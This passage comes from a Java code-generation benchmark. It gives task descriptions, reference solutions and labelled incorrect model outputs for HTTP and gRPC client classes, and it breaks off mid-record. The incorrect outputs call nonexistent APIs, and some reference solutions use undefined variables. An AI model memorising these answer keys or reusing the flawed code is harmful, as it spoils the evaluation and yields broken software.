    "Canonical_solution": "import io.github.dsheirer.audio.broadcast.IBroadcastMetadataUpdater;\nimport io.github.dsheirer.audio.broadcast.icecast.IcecastConfiguration;\nimport io.github.dsheirer.audio.broadcast.icecast.IcecastMetadata;\nimport io.github.dsheirer.identifier.IdentifierCollection;\nimport io.github.dsheirer.properties.SystemProperties;\nimport io.github.dsheirer.util.ThreadPool;\nimport org.slf4j.Logger;\nimport org.slf4j.LoggerFactory;\n\nimport java.io.IOException;\nimport java.io.UnsupportedEncodingException;\nimport java.net.URI;\nimport java.net.URLEncoder;\nimport java.net.http.HttpClient;\nimport java.net.http.HttpRequest;\nimport java.net.http.HttpResponse;\n\npublic class IcecastBroadcastMetadataUpdater implements IBroadcastMetadataUpdater\n{\n    private final static Logger mLog = LoggerFactory.getLogger(IcecastBroadcastMetadataUpdater.class);\n    private final static String UTF8 = \"UTF-8\";\n    private HttpClient mHttpClient = HttpClient.newBuilder().version(HttpClient.Version.HTTP_1_1).build();\n    private IcecastConfiguration mIcecastConfiguration;\n    private boolean mConnectionLoggingSuppressed = false;\n\n    public IcecastBroadcastMetadataUpdater(IcecastConfiguration icecastConfiguration)\n    {\n        mIcecastConfiguration = icecastConfiguration;\n    }\n\n    public void update(IdentifierCollection identifierCollection)\n    {\n        if(mIcecastConfiguration.hasInline())\n        {\n            return;\n        }\n\n        StringBuilder sb = new StringBuilder();\n\n        try\n        {\n            sb.append(\"http://\");\n            sb.append(mIcecastConfiguration.getHost());\n            sb.append(\":\");\n            sb.append(mIcecastConfiguration.getPort());\n            sb.append(\"/admin/metadata?mode=updinfo&mount=\");\n            sb.append(URLEncoder.encode(mIcecastConfiguration.getMountPoint(), UTF8));\n            sb.append(\"&charset=UTF%2d8\");\n            sb.append(\"&song=\").append(URLEncoder.encode(IcecastMetadata.getTitle(identifierCollection), UTF8));\n        }\n        catch(UnsupportedEncodingException uee)\n        {\n            mLog.error(\"Error encoding metadata information to UTF-8\", uee);\n            sb = null;\n        }\n\n        if(sb != null)\n        {\n            final String metadataUpdateURL = sb.toString();\n            URI uri = URI.create(metadataUpdateURL);\n\n            ThreadPool.CACHED.submit(new Runnable()\n            {\n                @Override\n                public void run()\n                {\n                    try\n                    {\n                        HttpRequest request = HttpRequest.newBuilder()\n                            .uri(uri)\n                            .header(\"Authorization\", mIcecastConfiguration.getBase64EncodedCredentials())\n                            .header(\"User-Agent\", SystemProperties.getInstance().getApplicationName())\n                            .GET()\n                            .build();\n\n                        HttpResponse<String> response = mHttpClient.send(request, HttpResponse.BodyHandlers.ofString());\n\n                        if(response != null)\n                        {\n                            if(response.statusCode() == 200)\n                            {\n                                mConnectionLoggingSuppressed = false;\n                            }\n                            else if(!mConnectionLoggingSuppressed)\n                            {\n                                mLog.info(\"Error submitting Icecast 2 Metadata update to URL [\" + metadataUpdateURL +\n                                    \"] HTTP Response Code [\" + response.statusCode() + \"] Body [\" + response.body() + \"]\");\n                                mConnectionLoggingSuppressed = true;\n                            }\n                        }\n                    }\n                    catch(IOException | InterruptedException e)\n                    {\n                        mLog.error(\"Error submitting Icecast metadata update\", e);\n                    }\n                }\n            });\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 17,
    "wrong_result": "```java\nimport org.apache.http.HttpEntity;\nimport org.apache.http.client.methods.CloseableHttpResponse;\nimport org.apache.http.client.methods.HttpPost;\nimport org.apache.http.entity.ContentType;\nimport org.apache.http.entity.StringEntity;\nimport org.apache.http.impl.client.CloseableHttpClient;\nimport org.apache.http.util.EntityUtils;\nimport org.slf4j.Logger;\n\npublic class IcecastBroadcastMetadataUpdater implements IBroadcastMetadataUpdater {\n    private final Logger mLog;\n    private final CloseableHttpClient mHttpClient;\n    private final IcecastConfiguration mIcecastConfiguration;\n    private boolean mConnectionLoggingSuppressed = false;\n\n    public IcecastBroadcastMetadataUpdater(IcecastConfiguration icecastConfiguration) {\n        this.mLog = org.slf4j.LoggerFactory.getLogger(IcecastBroadcastMetadataUpdater.class);\n        this.mHttpClient = org.apache.http.impl.client.HttpClients.createDefault();\n        this.mIcecastConfiguration = icecastConfiguration;\n    }\n\n    @Override\n    public void update(IdentifierCollection identifierCollection) {\n        try {\n            String url = String.format(\"http://%s:%d%s\", mIcecastConfiguration.getHost(), mIcecastConfiguration.getPort(), mIcecastConfiguration.getMountPoint());\n            HttpPost httpPost = new HttpPost(url);\n\n            String metadata = buildMetadataString(identifierCollection);\n            StringEntity entity = new StringEntity(metadata, ContentType.APPLICATION_FORM_URLENCODED.withCharset(\"UTF-8\"));\n            httpPost.setEntity(entity);\n\n            // Set basic authentication header\n            String auth = mIcecastConfiguration.getUsername() + \":\" + mIcecastConfiguration.getPassword();\n            byte[] encodedAuth = java.util.Base64.getEncoder().encode(auth.getBytes(java.nio.charset.StandardCharsets.ISO_8859_1));\n            String authHeader = \"Basic \" + new String(encodedAuth);\n            httpPost.setHeader(\"Authorization\", authHeader);\n            httpPost.setHeader(\"Content-Type\", \"application/x-www-form-urlencoded\");\n\n            CloseableHttpResponse response = mHttpClient.execute(httpPost);\n            try {\n                HttpEntity responseEntity = response.getEntity();\n                if (responseEntity != null) {\n                    EntityUtils.consume(responseEntity);\n                }\n            } finally {\n                response.close();\n            }\n        } catch (Exception e) {\n            if (!mConnectionLoggingSuppressed) {\n                mLog.error(\"Failed to update Icecast metadata\", e);\n                mConnectionLoggingSuppressed = true;\n            }\n        }\n    }\n\n    private String buildMetadataString(IdentifierCollection identifiers) {\n        StringBuilder sb = new StringBuilder();\n        sb.append(\"metadata=1&\");\n        sb.append(\"song=\").append(java.net.URLEncoder.encode(identifiers.getTitle(), java.nio.charset.StandardCharsets.UTF_8));\n        if (identifiers.getArtist() != null && !identifiers.getArtist().isEmpty()) {\n            sb.append(\"&artist=\").append(java.net.URLEncoder.encode(identifiers.getArtist(), java.nio.charset.StandardCharsets.UTF_8));\n        }\n        return sb.toString();\n    }\n}\n```"
  },
  {
    "Task_id": 49,
    "Instruction": "Task Description: Create a Java HTTP client class that simplifies making HTTP requests (GET, POST, DELETE) to a base URI, with support for parameterized URLs and exception handling.\n\nClass Description: TeenyHttpClient is a lightweight HTTP client wrapper that provides methods for common HTTP operations. It handles request construction, execution, and basic response handling while abstracting away boilerplate code.\n\nAttributes:\nbaseUri: String - The base URL to which all requests will be appended\nhttpClient: HttpClient - The underlying HttpClient instance used for making requests\n\nMethods:\nget: get(String url) -> HttpResponse<String> - Sends a GET request to the specified URL appended to the base URI\nget: get(String url, Object... params) -> HttpResponse<String> - Sends a GET request with URL parameters (formatted using String.format)\ndelete: delete(String url, Object... params) -> HttpResponse<String> - Sends a DELETE request with URL parameters\npost: post(String url, Object... params) -> HttpResponse<String> - Sends a POST request with URL parameters (with empty body)\nunchecked: unchecked(Exceptions.ThrowingSupplier<T> throwingSupplier) -> T - Helper method that wraps checked exceptions in RuntimeException",
    "Canonical_solution": "import java.net.URI;\nimport java.net.http.HttpClient;\nimport java.net.http.HttpRequest;\nimport java.net.http.HttpResponse;\nimport java.net.http.HttpResponse.BodyHandlers;\n\npublic class TeenyHttpClient {\n\n    private final String baseUri;\n    private final HttpClient httpClient;\n\n    public TeenyHttpClient(String baseUri) {\n        this.baseUri = baseUri;\n        httpClient = HttpClient.newBuilder()\n                .version(HttpClient.Version.HTTP_1_1)\n                .build();\n    }\n\n    public HttpResponse<String> get(String url) {\n        final HttpRequest httpRequest = HttpRequest.newBuilder()\n                .uri(URI.create(baseUri + url))\n                .build();\n\n        return unchecked(() -> httpClient.send(httpRequest, BodyHandlers.ofString()));\n    }\n\n    public HttpResponse<String> get(String url, Object... params) {\n        final HttpRequest httpRequest = HttpRequest.newBuilder()\n                .uri(URI.create(baseUri + String.format(url, params)))\n                .build();\n\n        return unchecked(() -> httpClient.send(httpRequest, BodyHandlers.ofString()));\n    }\n\n    public HttpResponse<String> delete(String url, Object... params) {\n        final HttpRequest httpRequest = HttpRequest.newBuilder()\n                .uri(URI.create(baseUri + String.format(url, params)))\n                .DELETE()\n                .build();\n\n        return unchecked(() -> httpClient.send(httpRequest, BodyHandlers.ofString()));\n    }\n\n    public HttpResponse<String> post(String url, Object... params) {\n        final HttpRequest httpRequest = HttpRequest.newBuilder()\n                .uri(URI.create(baseUri + String.format(url, params)))\n                .POST(HttpRequest.BodyPublishers.noBody())\n                .build();\n\n        return unchecked(() -> httpClient.send(httpRequest, BodyHandlers.ofString()));\n    }\n\n    private <T> T unchecked(Exceptions.ThrowingSupplier<T> throwingSupplier) {\n        try {\n            return throwingSupplier.get();\n        } catch (Exception e) {\n            throw new RuntimeException(e);\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 17,
    "wrong_result": "```java\nimport java.io.IOException;\nimport java.net.URI;\nimport java.net.URISyntaxException;\nimport java.net.http.HttpClient;\nimport java.net.http.HttpRequest;\nimport java.net.http.HttpResponse;\nimport java.util.regex.Matcher;\nimport java.util.regex.Pattern;\n\npublic class TeenyHttpClient {\n    private final String baseUri;\n    private final HttpClient httpClient;\n\n    public TeenyHttpClient(String baseUri) {\n        this.baseUri = baseUri;\n        this.httpClient = HttpClient.newHttpClient();\n    }\n\n    public HttpResponse<String> get(String url, Object... params) {\n        return unchecked(() -> {\n            String formattedUrl = formatUrl(url, params);\n            HttpRequest request = HttpRequest.newBuilder()\n                    .uri(new URI(baseUri + formattedUrl))\n                    .GET()\n                    .build();\n            return httpClient.send(request, HttpResponse.BodyHandlers.ofString());\n        });\n    }\n\n    public HttpResponse<String> delete(String url, Object... params) {\n        return unchecked(() -> {\n            String formattedUrl = formatUrl(url, params);\n            HttpRequest request = HttpRequest.newBuilder()\n                    .uri(new URI(baseUri + formattedUrl))\n                    .DELETE()\n                    .build();\n            return httpClient.send(request, HttpResponse.BodyHandlers.ofString());\n        });\n    }\n\n    public HttpResponse<String> post(String url, Object... params) {\n        return unchecked(() -> {\n            String formattedUrl = formatUrl(url, params);\n            HttpRequest request = HttpRequest.newBuilder()\n                    .uri(new URI(baseUri + formattedUrl))\n                    .POST(HttpRequest.BodyPublishers.noBody())\n                    .build();\n            return httpClient.send(request, HttpResponse.BodyHandlers.ofString());\n        });\n    }\n\n    private String formatUrl(String url, Object... params) {\n        if (params.length == 0) {\n            return url;\n        }\n        Pattern pattern = Pattern.compile(\"\\\\{\\\\d+\\\\}\");\n        Matcher matcher = pattern.matcher(url);\n        StringBuilder sb = new StringBuilder();\n        int paramIndex = 0;\n        int stringStart = 0;\n\n        while (matcher.find()) {\n            sb.append(url, stringStart, matcher.start());\n            sb.append(params[paramIndex++]);\n            stringStart = matcher.end();\n        }\n        sb.append(url.substring(stringStart));\n        return sb.toString();\n    }\n\n    public static <T> T unchecked(Exceptions.ThrowingSupplier<T> throwingSupplier) {\n        try {\n            return throwingSupplier.get();\n        } catch (Exception e) {\n            throw new RuntimeException(e);\n        }\n    }\n\n    public interface Exceptions {\n        @FunctionalInterface\n        interface ThrowingSupplier<T> {\n            T get() throws IOException, URISyntaxException, InterruptedException;\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 498,
    "Instruction": "Task Description: Create a gRPC client class for service discovery that handles connection management, stub creation, and remote method invocation with retry logic.\n\nClass Description: DiscoveryClient is a gRPC client implementation that manages connections to a discovery service, provides thread-safe operations, and includes automatic retry mechanisms for failed requests.\n\nAttributes:\n- requireResetStub: AtomicBoolean - Flag indicating whether the stub needs to be reset\n- channel: ManagedChannel - The gRPC communication channel\n- registerStub: DiscoveryServiceBlockingStub - Blocking stub for registration operations  \n- blockingStub: DiscoveryServiceBlockingStub - Blocking stub for general operations\n- readWriteLock: ReentrantReadWriteLock - Lock for thread-safe operations\n- pdAddresses: List<String> - Server addresses (implied from usage)\n\nMethods:\n- DiscoveryClient(String centerAddress) -> None - Constructor that initializes the client with target server address\n- getNodeInfos(Query query) -> NodeInfos - Retrieves node information from discovery service with retry logic\n- tryWithTimes(Function<V,R> function, V v) -> R - Helper method implementing retry logic for operations\n- resetStub() -> None - Resets the channel and stubs when connection issues occur  \n- resetChannel(String address) -> None - Recreates the channel and stubs with a new address\n- close() -> None - Shuts down the channel and cleans up resources\n\nThe class demonstrates proper gRPC client patterns including:\n1. Channel lifecycle management\n2. Thread-safe stub operations\n3. Connection retry mechanisms\n4. Resource cleanup\n5. Error handling for network operations",
    "Canonical_solution": "import org.apache.hugegraph.pd.grpc.discovery.DiscoveryServiceGrpc;\nimport org.apache.hugegraph.pd.grpc.discovery.NodeInfos;\nimport org.apache.hugegraph.pd.grpc.discovery.Query;\nimport org.apache.hugegraph.pd.grpc.discovery.RegisterInfo;\nimport io.grpc.ManagedChannel;\nimport io.grpc.ManagedChannelBuilder;\nimport java.util.concurrent.TimeUnit;\nimport java.util.concurrent.atomic.AtomicBoolean;\nimport java.util.concurrent.locks.ReentrantReadWriteLock;\nimport java.util.function.Function;\n\npublic class DiscoveryClient {\n\n    private final AtomicBoolean requireResetStub = new AtomicBoolean(false);\n    private ManagedChannel channel = null;\n    private DiscoveryServiceGrpc.DiscoveryServiceBlockingStub registerStub;\n    private DiscoveryServiceGrpc.DiscoveryServiceBlockingStub blockingStub;\n    private ReentrantReadWriteLock readWriteLock = new ReentrantReadWriteLock();\n\n    public DiscoveryClient(String centerAddress) {\n        resetChannel(centerAddress);\n    }\n\n    public NodeInfos getNodeInfos(Query query) {\n        return tryWithTimes((q) -> {\n            this.readWriteLock.readLock().lock();\n            NodeInfos nodes;\n            try {\n                nodes = this.blockingStub.getNodes(q);\n            } finally {\n                this.readWriteLock.readLock().unlock();\n            }\n            return nodes;\n        }, query);\n    }\n\n    private <V, R> R tryWithTimes(Function<V, R> function, V v) {\n        R r;\n        Exception ex = null;\n        for (int i = 0; i < 3; i++) {\n            try {\n                r = function.apply(v);\n                return r;\n            } catch (Exception e) {\n                requireResetStub.set(true);\n                resetStub();\n                ex = e;\n            }\n        }\n        if (ex != null) {\n            throw new RuntimeException(\"Discovery method failed\", ex);\n        }\n        return null;\n    }\n\n    private void resetStub() {\n        if (requireResetStub.get()) {\n            try {\n                resetChannel(pdAddresses.get(0));\n            } catch (Exception e) {\n                throw new RuntimeException(\"Failed to reset stub\", e);\n            }\n        }\n    }\n\n    private void resetChannel(String address) {\n        readWriteLock.writeLock().lock();\n        try {\n            if (requireResetStub.get()) {\n                if (channel != null) {\n                    channel.shutdownNow();\n                    channel.awaitTermination(100, TimeUnit.MILLISECONDS);\n                }\n                channel = ManagedChannelBuilder.forTarget(address)\n                        .usePlaintext().build();\n                this.registerStub = DiscoveryServiceGrpc.newBlockingStub(channel);\n                this.blockingStub = DiscoveryServiceGrpc.newBlockingStub(channel);\n                requireResetStub.set(false);\n            }\n        } catch (Exception e) {\n            throw new RuntimeException(\"Failed to reset channel\", e);\n        } finally {\n            readWriteLock.writeLock().unlock();\n        }\n    }\n\n    public void close() {\n        readWriteLock.writeLock().lock();\n        try {\n            if (channel != null) {\n                channel.shutdownNow();\n                channel.awaitTermination(100, TimeUnit.MILLISECONDS);\n            }\n        } catch (Exception e) {\n            throw new RuntimeException(\"Failed to close channel\", e);\n        } finally {\n            readWriteLock.writeLock().unlock();\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 23,
    "wrong_result": "```java\nimport io.grpc.*;\nimport java.util.List;\nimport java.util.concurrent.atomic.AtomicBoolean;\nimport java.util.concurrent.locks.ReentrantReadWriteLock;\nimport java.util.function.Function;\n\npublic class DiscoveryClient {\n    private final AtomicBoolean requireResetStub = new AtomicBoolean(false);\n    private ManagedChannel channel;\n    private DiscoveryServiceBlockingStub registerStub;\n    private DiscoveryServiceBlockingStub blockingStub;\n    private final ReentrantReadWriteLock readWriteLock = new ReentrantReadWriteLock();\n    private List<String> pdAddresses;\n\n    public DiscoveryClient(String centerAddress) {\n        this.channel = ManagedChannelBuilder.forTarget(centerAddress).usePlaintext().build();\n        this.blockingStub = DiscoveryServiceGrpc.newBlockingStub(channel);\n        this.registerStub = DiscoveryServiceGrpc.newBlockingStub(channel);\n    }\n\n    public NodeInfos getNodeInfos(Query query) {\n        return tryWithTimes(stub -> stub.getNodeInfo(query), blockingStub);\n    }\n\n    private <V, R> R tryWithTimes(Function<V, R> function, V v) {\n        int retryCount = 3;\n        while (retryCount-- > 0) {\n            try {\n                return function.apply(v);\n            } catch (StatusRuntimeException e) {\n                if (e.getStatus().getCode() == Status.Code.UNAVAILABLE) {\n                    resetStub();\n                    continue;\n                }\n                throw e;\n            }\n        }\n        throw new RuntimeException(\"Failed after multiple retries\");\n    }\n\n    private void resetStub() {\n        readWriteLock.writeLock().lock();\n        try {\n            if (requireResetStub.compareAndSet(true, false)) {\n                resetChannel(pdAddresses.get(0));\n            }\n        } finally {\n            readWriteLock.writeLock().unlock();\n        }\n    }\n\n    private void resetChannel(String address) {\n        if (channel != null) {\n            channel.shutdownNow();\n        }\n        channel = ManagedChannelBuilder.forTarget(address).usePlaintext().build();\n        blockingStub = DiscoveryServiceGrpc.newBlockingStub(channel);\n        registerStub = DiscoveryServiceGrpc.newBlockingStub(channel);\n    }\n\n    public void close() {\n        if (channel != null) {\n            channel.shutdownNow();\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 502,
    "Instruction": "Task Description: Create a Java class that implements a gRPC client for interacting with a PD (Placement Driver) server, supporting both blocking and asynchronous communication patterns, with connection management and error handling capabilities.\n\nClass Description: AbstractClient is an abstract base class that provides core gRPC client functionality for PD server communication. It manages channel connections, creates stubs, implements retry logic, and handles connection failures. The class is designed to be extended by concrete implementations that provide specific stub creation methods.\n\nAttributes:\n- chs: ConcurrentHashMap<String, ManagedChannel> - Shared map of managed channels by host\n- stubProxy: AbstractClientStubProxy - Proxy for managing stub instances\n- config: PDConfig - Configuration object containing server hosts and timeout settings\n- channel: ManagedChannel - Current active channel connection\n- stubs: ConcurrentMap<String, AbstractBlockingStub> - Map of blocking stubs by address\n\nMethods:\n- AbstractClient(PDConfig config) -> void - Constructor that initializes the client with configuration\n- getBlockingStub() -> AbstractBlockingStub - Gets or creates a blocking stub instance\n- getStub() -> AbstractStub - Gets or creates an async stub instance\n- createStub() -> AbstractStub - Abstract method to be implemented for creating async stubs\n- createBlockingStub() -> AbstractBlockingStub - Abstract method to be implemented for creating blocking stubs\n- resetStub() -> String - Resets the connection and finds the current leader host\n- blockingUnaryCall(MethodDescriptor<ReqT, RespT> method, ReqT req) -> RespT - Makes a blocking unary RPC call with default retries\n- blockingUnaryCall(MethodDescriptor<ReqT, RespT> method, ReqT req, int retry) -> RespT - Makes a blocking unary RPC call with specified retries\n- concurrentBlockingUnaryCall(MethodDescriptor<ReqT, RespT> method, ReqT req, Predicate<RespT> predicate) -> KVPair<Boolean, RespT> - Makes concurrent calls to multiple hosts\n- streamingCall(MethodDescriptor<ReqT, RespT> method, ReqT request, StreamObserver<RespT> responseObserver, int retry) -> void - Makes a server streaming call\n- close() -> void - Closes all active channels and cleans up resources\n- closeChannel(ManagedChannel channel) -> void - Helper method to safely close a channel",
    "Canonical_solution": "import java.io.Closeable;\nimport java.util.concurrent.ConcurrentHashMap;\nimport java.util.concurrent.ConcurrentMap;\nimport java.util.concurrent.TimeUnit;\nimport java.util.function.Predicate;\nimport java.util.stream.Stream;\n\nimport org.apache.hugegraph.pd.common.KVPair;\nimport org.apache.hugegraph.pd.common.PDException;\nimport org.apache.hugegraph.pd.grpc.PDGrpc;\nimport org.apache.hugegraph.pd.grpc.PDGrpc.PDBlockingStub;\nimport org.apache.hugegraph.pd.grpc.Pdpb;\n\nimport io.grpc.Channel;\nimport io.grpc.ClientCall;\nimport io.grpc.ManagedChannel;\nimport io.grpc.ManagedChannelBuilder;\nimport io.grpc.MethodDescriptor;\nimport io.grpc.StatusRuntimeException;\nimport io.grpc.stub.AbstractBlockingStub;\nimport io.grpc.stub.AbstractStub;\nimport io.grpc.stub.ClientCalls;\nimport io.grpc.stub.StreamObserver;\nimport lombok.extern.slf4j.Slf4j;\n\n@Slf4j\npublic abstract class AbstractClient implements Closeable {\n\n    private static final ConcurrentHashMap<String, ManagedChannel> chs = new ConcurrentHashMap<>();\n    protected final AbstractClientStubProxy stubProxy;\n    protected final PDConfig config;\n    protected ManagedChannel channel = null;\n    protected volatile ConcurrentMap<String, AbstractBlockingStub> stubs = null;\n\n    protected AbstractClient(PDConfig config) {\n        String[] hosts = config.getServerHost().split(\",\");\n        this.stubProxy = new AbstractClientStubProxy(hosts);\n        this.config = config;\n    }\n\n    protected AbstractBlockingStub getBlockingStub() throws PDException {\n        if (stubProxy.getBlockingStub() == null) {\n            synchronized (this) {\n                if (stubProxy.getBlockingStub() == null) {\n                    String host = resetStub();\n                    if (host.isEmpty()) {\n                        throw new PDException(Pdpb.ErrorType.PD_UNREACHABLE_VALUE,\n                                              \"PD unreachable, pd.peers=\" +\n                                              config.getServerHost());\n                    }\n                }\n            }\n        }\n        return (AbstractBlockingStub) stubProxy.getBlockingStub()\n                                               .withDeadlineAfter(config.getGrpcTimeOut(),\n                                                                  TimeUnit.MILLISECONDS);\n    }\n\n    protected AbstractStub getStub() throws PDException {\n        if (stubProxy.getStub() == null) {\n            synchronized (this) {\n                if (stubProxy.getStub() == null) {\n                    String host = resetStub();\n                    if (host.isEmpty()) {\n                        throw new PDException(Pdpb.ErrorType.PD_UNREACHABLE_VALUE,\n                                              \"PD unreachable, pd.peers=\" +\n                                              config.getServerHost());\n                    }\n                }\n            }\n        }\n        return stubProxy.getStub();\n    }\n\n    protected abstract AbstractStub createStub();\n\n    protected abstract AbstractBlockingStub createBlockingStub();\n\n    private String resetStub() {\n        String leaderHost = \"\";\n        for (int i = 0; i < stubProxy.getHostCount(); i++) {\n            String host = stubProxy.nextHost();\n            channel = ManagedChannelBuilder.forTarget(host).usePlaintext().build();\n            PDBlockingStub blockingStub = PDGrpc.newBlockingStub(channel)\n                                                .withDeadlineAfter(config.getGrpcTimeOut(),\n                                                                   TimeUnit.MILLISECONDS);\n            try {\n                GetMembersRequest request = Pdpb.GetMembersRequest.newBuilder()\n                                                                  .setHeader(header).build();\n                GetMembersResponse members = blockingStub.getMembers(request);\n                Metapb.Member leader = members.getLeader();\n                leaderHost = leader.getGrpcUrl();\n                close();\n                channel = ManagedChannelBuilder.forTarget(leaderHost).usePlaintext().build();\n                stubProxy.setBlockingStub(createBlockingStub());\n                stubProxy.setStub(createStub());\n                log.info(\"PDClient connect to host = {} success\", leaderHost);\n                break;\n            } catch (Exception e) {\n                log.error(\"PDClient connect to {} exception {}, {}\", host, e.getMessage(),\n                          e.getCause() != null ? e.getCause().getMessage() : \"\");\n            }\n        }\n        return leaderHost;\n    }\n\n    protected <ReqT, RespT, StubT extends AbstractBlockingStub<StubT>> RespT blockingUnaryCall(\n            MethodDescriptor<ReqT, RespT> method, ReqT req) throws PDException {\n        return blockingUnaryCall(method, req, 5);\n    }\n\n    protected <ReqT, RespT, StubT extends AbstractBlockingStub<StubT>> RespT blockingUnaryCall(\n            MethodDescriptor<ReqT, RespT> method, ReqT req, int retry) throws PDException {\n        AbstractBlockingStub stub = getBlockingStub();\n        try {\n            RespT resp =\n                    ClientCalls.blockingUnaryCall(stub.getChannel(), method, stub.getCallOptions(),\n                                                  req);\n            return resp;\n        } catch (Exception e) {\n            log.error(method.getFullMethodName() + \" exception, {}\", e.getMessage());\n            if (e instanceof StatusRuntimeException) {\n                if (retry < stubProxy.getHostCount()) {\n                    synchronized (this) {\n                        stubProxy.setBlockingStub(null);\n                    }\n                    return blockingUnaryCall(method, req, ++retry);\n                }\n            }\n        }\n        return null;\n    }\n\n    protected <ReqT, RespT> KVPair<Boolean, RespT> concurrentBlockingUnaryCall(\n            MethodDescriptor<ReqT, RespT> method, ReqT req, Predicate<RespT> predicate) {\n        LinkedList<String> hostList = this.stubProxy.getHostList();\n        if (this.stubs == null) {\n            synchronized (this) {\n                if (this.stubs == null) {\n                    this.stubs = new ConcurrentHashMap<>(hostList.size());\n                }\n            }\n        }\n        Stream<RespT> respTStream = hostList.parallelStream().map((address) -> {\n            AbstractBlockingStub stub = getConcurrentBlockingStub(address);\n            RespT resp = ClientCalls.blockingUnaryCall(stub.getChannel(),\n                                                       method, stub.getCallOptions(), req);\n            return resp;\n        });\n        KVPair<Boolean, RespT> pair;\n        AtomicReference<RespT> response = new AtomicReference<>();\n        boolean result = respTStream.anyMatch((r) -> {\n            response.set(r);\n            return predicate.test(r);\n        });\n        if (result) {\n            pair = new KVPair<>(true, null);\n        } else {\n            pair = new KVPair<>(false, response.get());\n        }\n        return pair;\n    }\n\n    protected <ReqT, RespT> void streamingCall(MethodDescriptor<ReqT, RespT> method, ReqT request,\n                                               StreamObserver<RespT> responseObserver,\n                                               int retry) throws PDException {\n        AbstractStub stub = getStub();\n        try {\n            ClientCall<ReqT, RespT> call = stub.getChannel().newCall(method, stub.getCallOptions());\n            ClientCalls.asyncServerStreamingCall(call, request, responseObserver);\n        } catch (Exception e) {\n            if (e instanceof StatusRuntimeException) {\n                if (retry < stubProxy.getHostCount()) {\n                    synchronized (this) {\n                        stubProxy.setStub(null);\n                    }\n                    streamingCall(method, request, responseObserver, ++retry);\n                    return;\n                }\n            }\n            log.error(\"rpc call with exception, {}\", e.getMessage());\n        }\n    }\n\n    @Override\n    public void close() {\n        closeChannel(channel);\n        if (stubs != null) {\n            for (AbstractBlockingStub stub : stubs.values()) {\n                closeChannel((ManagedChannel) stub.getChannel());\n            }\n        }\n    }\n\n    private void closeChannel(ManagedChannel channel) {\n        try {\n            while (channel != null &&\n                   !channel.shutdownNow().awaitTermination(100, TimeUnit.MILLISECONDS)) {\n                continue;\n            }\n        } catch (Exception e) {\n            log.info(\"Close channel with error : \", e);\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 23,
    "wrong_result": "```java\nimport io.grpc.*;\nimport java.util.concurrent.*;\nimport java.util.concurrent.atomic.AtomicInteger;\nimport java.util.Map;\nimport java.util.Set;\nimport java.util.HashSet;\nimport java.util.concurrent.ConcurrentHashMap;\n\npublic abstract class AbstractClient<ReqT, RespT> {\n    protected final ConcurrentHashMap<String, ManagedChannel> chs = new ConcurrentHashMap<>();\n    protected AbstractClientStubProxy stubProxy;\n    protected PDConfig config;\n    protected ManagedChannel channel;\n    protected ConcurrentMap<String, AbstractBlockingStub<?>> stubs = new ConcurrentHashMap<>();\n\n    public AbstractClient(PDConfig config) {\n        this.config = config;\n        this.stubProxy = new AbstractClientStubProxy();\n    }\n\n    public abstract AbstractBlockingStub<?> createBlockingStub(ManagedChannel channel);\n\n    public abstract AbstractStub<?> createStub(ManagedChannel channel);\n\n    public AbstractBlockingStub<?> getBlockingStub() {\n        String host = resetStub();\n        if (channel == null || !channel.isShutdown()) {\n            return (AbstractBlockingStub<?>) stubs.computeIfAbsent(host, k -> createBlockingStub(channel));\n        }\n        return null;\n    }\n\n    public AbstractStub<?> getStub() {\n        String host = resetStub();\n        if (channel == null || !channel.isShutdown()) {\n            return (AbstractStub<?>) stubs.computeIfAbsent(host, k -> createStub(channel));\n        }\n        return null;\n    }\n\n    public String resetStub() {\n        Set<String> hosts = new HashSet<>(config.getHosts());\n        for (String host : hosts) {\n            try {\n                ManagedChannel newChannel = ManagedChannelBuilder.forTarget(host)\n                        .usePlaintext()\n                        .build();\n                AbstractStub<?> stub = createStub(newChannel);\n                MethodDescriptor<ReqT, RespT> method = MethodDescriptor.<ReqT, RespT>newBuilder()\n                        .setRequestMarshaller(new BytesMarshaller<>())\n                        .setResponseMarshaller(new BytesMarshaller<>())\n                        .setType(MethodType.UNKNOWN)\n                        .build();\n\n                stub.withDeadlineAfter(config.getTimeout(), TimeUnit.MILLISECONDS).invoke(method, null);\n                closeChannel(channel);\n                channel = newChannel;\n                return host;\n            } catch (StatusRuntimeException e) {\n                continue;\n            }\n        }\n        throw new RuntimeException(\"No available PD server found.\");\n    }\n\n    public RespT blockingUnaryCall(MethodDescriptor<ReqT, RespT> method, ReqT req) {\n        return blockingUnaryCall(method, req, 3);\n    }\n\n    public RespT blockingUnaryCall(MethodDescriptor<ReqT, RespT> method, ReqT req, int retry) {\n        int attempts = 0;\n        while (attempts < retry) {\n            try {\n                AbstractBlockingStub<?> stub = getBlockingStub();\n                return stub instanceof AbstractBlockingStub ? ((AbstractBlockingStub<RespT>) stub).unaryCall(method, req) : null;\n            } catch (StatusRuntimeException e) {\n                attempts++;\n                if (attempts >= retry) {\n                    throw e;\n                }\n                resetStub();\n            }\n        }\n        return null;\n    }\n\n    public KVPair<Boolean, RespT> concurrentBlockingUnaryCall(MethodDescriptor<ReqT, RespT> method, ReqT req, Predicate<RespT> predicate) {\n        CountDownLatch latch = new CountDownLatch(1);\n        KVPair<Boolean, RespT> result = new KVPair<>(false, null);\n        for (String host : config.getHosts()) {\n            ManagedChannel channel = chs.computeIfAbsent(host, h -> ManagedChannelBuilder.forTarget(h).usePlaintext().build());\n            AbstractBlockingStub<?> stub = createBlockingStub(channel);\n            new Thread(() -> {\n                try {\n                    RespT resp = stub instanceof AbstractBlockingStub ? ((AbstractBlockingStub<RespT>) stub).unaryCall(method, req) : null;\n                    if (resp != null && predicate.test(resp)) {\n                        result.setKey(true);\n                        result.setValue(resp);\n                    }\n                } finally {\n                    latch.countDown();\n                }\n            }).start();\n        }\n        try {\n            latch.await();\n        } catch (InterruptedException e) {\n            Thread.currentThread().interrupt();\n        }\n        return result;\n    }\n\n    public void streamingCall(MethodDescriptor<ReqT, RespT> method, ReqT request, StreamObserver<RespT> responseObserver, int retry) {\n        int attempts = 0;\n        while (attempts < retry) {\n            try {\n                AbstractStub<?> stub = getStub();\n                if (stub instanceof ClientStreamingMethod) {\n                    ((ClientStreamingMethod<?, RespT>) stub).method((ClientCall.Listener<RespT>) responseObserver, request);\n                    